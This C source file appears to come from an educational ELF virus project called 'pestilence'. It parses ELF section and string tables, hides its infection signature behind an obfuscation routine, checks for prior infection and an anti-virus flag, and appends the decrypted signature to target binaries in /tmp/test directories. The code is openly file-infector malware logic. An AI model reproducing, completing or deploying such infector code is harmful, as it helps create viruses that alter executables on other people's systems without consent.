#define _GNU_SOURCE

#include "../incl/pestilence.h"

char    *ft_getdir(int i)
{
    if (i == 0)
        return("/tmp/test");
    else
        return("/tmp/test2");
}

void    ft_pointer_section_table(t_pestilence *pestilence)
{
    pestilence->sectab = (Elf64_Shdr *)(pestilence->elf + pestilence->header->e_shoff);
}

void    ft_pointer_strings_table(t_pestilence *pestilence)
{
    pestilence->strtab = (char *)(pestilence->elf + pestilence->sectab[pestilence->header->e_shstrndx].sh_offset);
}

int ft_detect_prev_infection(t_pestilence *pestilence)
{
    ft_obfuscation(pestilence);
    pestilence->signd = memmem(pestilence->elf, pestilence->file_size, pestilence->decrypted, strlen(pestilence->decrypted));
    if (pestilence->signd || pestilence->anti_virus == 1)
        return (0);
    else
        return(-1);
}

void    ft_infect(t_pestilence *pestilence)
{
    munmap(pestilence->elf, pestilence->file_size);
    close(pestilence->fd);
    pestilence->fd = open(pestilence->binary, O_WRONLY);
    if (pestilence->fd == -1)
        return;
    lseek(pestilence->fd, 0, SEEK_END);
    write(pestilence->fd, pestilence->decrypted, strlen(pestilence->decrypted));
    close(pestilence->fd);
}